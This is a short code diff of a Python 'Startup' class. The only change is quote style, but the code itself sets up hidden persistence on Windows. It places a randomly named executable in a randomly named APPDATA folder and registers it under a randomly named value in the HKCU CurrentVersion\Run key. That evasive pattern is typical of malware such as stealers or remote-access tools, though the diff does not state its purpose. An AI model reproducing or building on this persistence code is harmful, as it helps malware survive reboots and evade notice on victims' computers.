@@ -4,13 +4,14 @@ import os
 import shutil
 from _random_string import get_random_string
 
+
 class Startup:
     def __init__(self):
         self.dir_name = get_random_string(12)
-        self.working_dir = os.path.join(os.getenv('APPDATA'), self.dir_name)
-        self.exec_name = f'{get_random_string(16)}.exe'
+        self.working_dir = os.path.join(os.getenv("APPDATA"), self.dir_name)
+        self.exec_name = f"{get_random_string(16)}.exe"
         self.full_path = os.path.join(self.working_dir, self.exec_name)
-        self.reg_entry = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
+        self.reg_entry = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
         self.regent_name = get_random_string(18)
 
         self.mkdir()
